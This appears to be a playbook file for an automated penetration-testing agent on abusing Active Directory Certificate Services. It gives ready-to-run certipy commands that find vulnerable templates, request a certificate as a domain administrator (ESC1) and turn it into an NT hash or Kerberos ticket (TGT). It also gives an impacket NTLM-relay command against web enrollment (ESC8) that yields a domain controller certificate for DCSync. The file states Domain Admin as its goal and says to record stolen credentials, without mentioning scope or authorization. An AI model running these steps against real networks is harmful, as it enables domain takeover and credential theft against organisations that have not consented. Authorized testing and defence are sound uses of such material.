---
name: adcs
services: [adcs, ad-cs]
summary: AD Certificate Services — ESC1-8 template/CA abuse and NTLM-relay to a certificate
---

# AD CS playbook

AD Certificate Services is one of the most reliable paths to Domain Admin: a misconfigured
template or the web-enrollment endpoint lets you request a certificate that authenticates as a
privileged user. Use `certipy`. The commands below are **examples** — compose your own.

## Find the CA & vulnerable templates
- Example: `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout`

look for: a template flagged ESC1–ESC8, the CA name, and whether HTTP web enrollment is up (ESC8).

## ESC1 — enrollee supplies the subject (most common)
A template that lets you set the SAN → request a cert **as** a domain admin, then auth with it.
- Example (request): `certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <tmpl> -upn administrator@<domain>`
- Example (use it): `certipy auth -pfx administrator.pfx -dc-ip <dc>` → NT hash / TGT for that user

look for: an ESC1 template with a Client Authentication EKU and enrollment rights for your user.

## ESC8 — NTLM relay to web enrollment
The CA's HTTP enrollment endpoint accepts NTLM → relay a coerced DC authentication to it and
get a DC certificate (→ DCSync).
- Example: `impacket_ntlmrelay --target http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, then coerce the DC (`load_playbook(["coercion"])`)

look for: HTTP enrollment reachable and a machine account to coerce.

## Other ESCs
ESC2/3 (any-purpose / enrollment-agent), ESC4 (writable template → turn it into ESC1), ESC6
(`EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA), ESC7 (CA admin rights). `certipy find` names which apply.

## Record
A certificate that authenticates as DA/DC = critical; `record_credential` the recovered hash/TGT.
